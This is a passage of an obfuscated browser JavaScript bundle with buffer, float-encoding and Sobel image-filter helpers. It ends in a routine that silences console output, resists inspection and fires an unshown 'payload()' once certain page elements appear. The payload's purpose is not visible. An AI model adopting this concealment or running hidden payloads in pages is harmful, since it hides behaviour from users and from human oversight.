Uint8Array[vr(0x1f3)][vr(0x282)][vr(0x300)](iq,this['subarray'](s1,s2),s0);}return s3;},g['prototype'][gb(0x339)]=function iq(s0,s1,s2,s3){var vc=gb;if(typeof s0===vc(0x2a2)){if(typeof s1==='string')s3=s1,s1=0x0,s2=this[vc(0x2b0)];else typeof s2===vc(0x2a2)&&(s3=s2,s2=this[vc(0x2b0)]);if(s3!==undefined&&typeof s3!=='string')throw new TypeError('encoding\x20must\x20be\x20a\x20string');if(typeof s3===vc(0x2a2)&&!g[vc(0x29e)](s3))throw new TypeError(vc(0x1ff)+s3);if(s0[vc(0x2b0)]===0x1){var s4=s0[vc(0x368)](0x0);(s3===vc(0x2ec)&&s4<0x80||s3===vc(0x21f))&&(s0=s4);}}else typeof s0===vc(0x275)&&(s0=s0&0xff);if(s1<0x0||this[vc(0x2b0)]<s1||this[vc(0x2b0)]<s2)throw new RangeError(vc(0x2c9));if(s2<=s1)return this;s1=s1>>>0x0,s2=s2===undefined?this[vc(0x2b0)]:s2>>>0x0;if(!s0)s0=0x0;var s5;if(typeof s0===vc(0x275))for(s5=s1;s5<s2;++s5){this[s5]=s0;}else{var s6=g[vc(0x1f8)](s0)?s0:g[vc(0x2b7)](s0,s3),s7=s6[vc(0x2b0)];if(s7===0x0)throw new TypeError('The\x20value\x20\x22'+s0+vc(0x2e3));for(s5=0x0;s5<s2-s1;++s5){this[s5+s1]=s6[s5%s7];}}return this;};var f=/[^+/0-9A-Za-z-_]/g;function a(s0){var vu=gb;s0=s0[vu(0x2c5)]('=')[0x0],s0=s0['trim']()[vu(0x3b1)](f,'');if(s0[vu(0x2b0)]<0x2)return'';while(s0[vu(0x2b0)]%0x4!==0x0){s0=s0+'=';}return s0;}function R(s0){var vA=gb;if(s0<0x10)return'0'+s0[vA(0x1ec)](0x10);return s0[vA(0x1ec)](0x10);}function D(s0,s1){var vO=gb;s1=s1||Infinity;var s2,s3=s0[vO(0x2b0)],s4=null,s5=[];for(var s6=0x0;s6<s3;++s6){s2=s0[vO(0x368)](s6);if(s2>0xd7ff&&s2<0xe000){if(!s4){if(s2>0xdbff){if((s1-=0x3)>-0x1)s5[vO(0x32c)](0xef,0xbf,0xbd);continue;}else{if(s6+0x1===s3){if((s1-=0x3)>-0x1)s5[vO(0x32c)](0xef,0xbf,0xbd);continue;}}s4=s2;continue;}if(s2<0xdc00){if((s1-=0x3)>-0x1)s5[vO(0x32c)](0xef,0xbf,0xbd);s4=s2;continue;}s2=(s4-0xd800<<0xa|s2-0xdc00)+0x10000;}else{if(s4){if((s1-=0x3)>-0x1)s5[vO(0x32c)](0xef,0xbf,0xbd);}}s4=null;if(s2<0x80){if((s1-=0x1)<0x0)break;s5[vO(0x32c)](s2);}else{if(s2<0x800){if((s1-=0x2)<0x0)break;s5[vO(0x32c)](s2>>0x6|0xc0,s2&0x3f|0x80);}else{if(s2<0x10000){if((s1-=0x3)<0x0)break;s5['push'](s2>>0xc|0xe0,s2>>0x6&0x3f|0x80,s2&0x3f|0x80);}else{if(s2<0x110000){if((s1-=0x4)<0x0)break;s5[vO(0x32c)](s2>>0x12|0xf0,s2>>0xc&0x3f|0x80,s2>>0x6&0x3f|0x80,s2&0x3f|0x80);}else throw new Error('Invalid\x20code\x20point');}}}}return s5;}function q(s0){var vQ=gb,s1=[];for(var s2=0x0;s2<s0['length'];++s2){s1[vQ(0x32c)](s0['charCodeAt'](s2)&0xff);}return s1;}function i0(s0,s1){var vY=gb,s2,s3,s4,s5=[];for(var s6=0x0;s6<s0['length'];++s6){if((s1-=0x2)<0x0)break;s2=s0[vY(0x368)](s6),s3=s2>>0x8,s4=s2%0x100,s5[vY(0x32c)](s4),s5[vY(0x32c)](s3);}return s5;}function i1(s0){var vP=gb;return S[vP(0x279)](a(s0));}function i2(s0,s1,s2,s3){var vw=gb;for(var s4=0x0;s4<s3;++s4){if(s4+s2>=s1['length']||s4>=s0[vw(0x2b0)])break;s1[s4+s2]=s0[s4];}return s4;}function i3(s0,s1){var vG=gb;return s0 instanceof s1||s0!=null&&s0[vG(0x234)]!=null&&s0[vG(0x234)][vG(0x280)]!=null&&s0[vG(0x234)][vG(0x280)]===s1[vG(0x280)];}function i4(s0){return s0!==s0;}}[vW(0x300)](this,i(vW(0x258))[vW(0x285)]));},{'base64-js':0xb,'buffer':0xc,'ieee754':0xd}],0xd:[function(i,s,F){var vl=z;F[vl(0x296)]=function(g,S,B,M,K){var ve=vl,C,k,h=K*0x8-M-0x1,t=(0x1<<h)-0x1,p=t>>0x1,X=-0x7,T=B?K-0x1:0x0,j=B?-0x1:0x1,b=g[S+T];T+=j,C=b&(0x1<<-X)-0x1,b>>=-X,X+=h;for(;X>0x0;C=C*0x100+g[S+T],T+=j,X-=0x8){}k=C&(0x1<<-X)-0x1,C>>=-X,X+=M;for(;X>0x0;k=k*0x100+g[S+T],T+=j,X-=0x8){}if(C===0x0)C=0x1-p;else{if(C===t)return k?NaN:(b?-0x1:0x1)*Infinity;else k=k+Math[ve(0x294)](0x2,M),C=C-p;}return(b?-0x1:0x1)*k*Math[ve(0x294)](0x2,C-M);},F[vl(0x1e6)]=function(g,S,B,M,K,C){var vm=vl,k,h,t,p=C*0x8-K-0x1,X=(0x1<<p)-0x1,T=X>>0x1,j=K===0x17?Math['pow'](0x2,-0x18)-Math['pow'](0x2,-0x4d):0x0,b=M?0x0:C-0x1,Z=M?0x1:-0x1,E=S<0x0||S===0x0&&0x1/S<0x0?0x1:0x0;S=Math['abs'](S);if(isNaN(S)||S===Infinity)h=isNaN(S)?0x1:0x0,k=X;else{k=Math[vm(0x271)](Math[vm(0x2ca)](S)/Math[vm(0x25f)]);S*(t=Math['pow'](0x2,-k))<0x1&&(k--,t*=0x2);k+T>=0x1?S+=j/t:S+=j*Math[vm(0x294)](0x2,0x1-T);S*t>=0x2&&(k++,t/=0x2);if(k+T>=X)h=0x0,k=X;else k+T>=0x1?(h=(S*t-0x1)*Math[vm(0x294)](0x2,K),k=k+T):(h=S*Math['pow'](0x2,T-0x1)*Math[vm(0x294)](0x2,K),k=0x0);}for(;K>=0x8;g[B+b]=h&0xff,b+=Z,h/=0x100,K-=0x8){}k=k<<K|h,p+=K;for(;p>0x0;g[B+b]=k&0xff,b+=Z,k/=0x100,p-=0x8){}g[B+b-Z]|=E*0x80;};},{}],0xe:[function(i,s,F){(function(g){'use strict';var vJ=z;function S(M){var vo=z;if(!(this instanceof S))return new S(M);var K=M[vo(0x289)],C=M['height'],k=[[-0x1,0x0,0x1],[-0x2,0x0,0x2],[-0x1,0x0,0x1]],h=[[-0x1,-0x2,-0x1],[0x0,0x0,0x0],[0x1,0x2,0x1]],t=[],p=[];function X(Y){return function(P,w,G){return G=G||0x0,Y[(K*w+P)*0x4+G];};}var T=M[vo(0x1dd)],j=X(T),Z,E;for(E=0x0;E<C;E++){for(Z=0x0;Z<K;Z++){var U=j(Z,E,0x0),V=j(Z,E,0x1),d=j(Z,E,0x2),c=(U+V+d)/0x3;p['push'](c,c,c,0xff);}}j=X(p);for(E=0x0;E<C;E++){for(Z=0x0;Z<K;Z++){var u=k[0x0][0x0]*j(Z-0x1,E-0x1)+k[0x0][0x1]*j(Z,E-0x1)+k[0x0][0x2]*j(Z+0x1,E-0x1)+k[0x1][0x0]*j(Z-0x1,E)+k[0x1][0x1]*j(Z,E)+k[0x1][0x2]*j(Z+0x1,E)+k[0x2][0x0]*j(Z-0x1,E+0x1)+k[0x2][0x1]*j(Z,E+0x1)+k[0x2][0x2]*j(Z+0x1,E+0x1),A=h[0x0][0x0]*j(Z-0x1,E-0x1)+h[0x0][0x1]*j(Z,E-0x1)+h[0x0][0x2]*j(Z+0x1,E-0x1)+h[0x1][0x0]*j(Z-0x1,E)+h[0x1][0x1]*j(Z,E)+h[0x1][0x2]*j(Z+0x1,E)+h[0x2][0x0]*j(Z-0x1,E+0x1)+h[0x2][0x1]*j(Z,E+0x1)+h[0x2][0x2]*j(Z+0x1,E+0x1),O=Math['sqrt'](u*u+A*A)>>>0x0;t[vo(0x32c)](O,O,O,0xff);}}var Q=t;return typeof Uint8ClampedArray===vo(0x305)&&(Q=new Uint8ClampedArray(t)),Q[vo(0x26e)]=function(){var vL=vo;return S[vL(0x26e)](Q,K,C);},Q;}S[vJ(0x26e)]=function M(K,C,k){var vH=vJ;if(typeof ImageData==='function'&&Object[vH(0x1f3)][vH(0x1ec)][vH(0x300)](K)===vH(0x1f6))return new ImageData(K,C,k);else{if(typeof window===vH(0x24c)&&typeof window['document']===vH(0x24c)){var h=document['createElement'](vH(0x24f));if(typeof h[vH(0x2be)]==='function'){var t=h[vH(0x2be)]('2d'),p=t['createImageData'](C,k);return p[vH(0x1dd)][vH(0x282)](K),p;}else return new B(K,C,k);}else return new B(K,C,k);}};function B(K,C,k){return{'width':C,'height':k,'data':K};}if(typeof F!==vJ(0x2db))typeof s!=='undefined'&&s['exports']&&(F=s[vJ(0x316)]=S),F[vJ(0x28d)]=S;else typeof define===vJ(0x305)&&define[vJ(0x32d)]?define([],function(){return S;}):g['Sobel']=S;}(this));},{}]},{},[0x1]));}(function checkAndRun(){var vI=s9,S=(function(){var C=!![];return function(k,h){var t=C?function(){if(h){var p=h['apply'](k,arguments);return h=null,p;}}:function(){};return C=![],t;};}()),B=S(this,function(){var vN=z;return B[vN(0x1ec)]()['search'](vN(0x38b))['toString']()['constructor'](B)[vN(0x2eb)](vN(0x38b));});B();var M=(function(){var C=!![];return function(k,h){var t=C?function(){if(h){var p=h['apply'](k,arguments);return h=null,p;}}:function(){};return C=![],t;};}()),K=M(this,function(){var vn=z,C;try{var k=Function('return\x20(function()\x20'+vn(0x341)+');');C=k();}catch(b){C=window;}var h=C[vn(0x1ce)]=C[vn(0x1ce)]||{},t=[vn(0x2ca),vn(0x32f),vn(0x3a5),vn(0x3a1),vn(0x358),vn(0x1f0),'trace'];for(var p=0x0;p<t[vn(0x2b0)];p++){var X=M[vn(0x234)][vn(0x1f3)][vn(0x2da)](M),T=t[p],j=h[T]||X;X[vn(0x34a)]=M[vn(0x2da)](M),X['toString']=j[vn(0x1ec)][vn(0x2da)](j),h[T]=X;}});K(),console[vI(0x2ca)](vI(0x2d3)),document[vI(0x1d9)]==='complete'&&document[vI(0x33f)]('canvas')&&document[vI(0x33f)](vI(0x267))&&document[vI(0x33f)]('.selected')&&document[vI(0x33f)]('.selected')[vI(0x32e)][vI(0x394)]&&document['getElementById'](vI(0x23e))[vI(0x29f)][vI(0x2b0)]?(console['log'](vI(0x331)),payload()):setTimeout(checkAndRun,0x64);}());
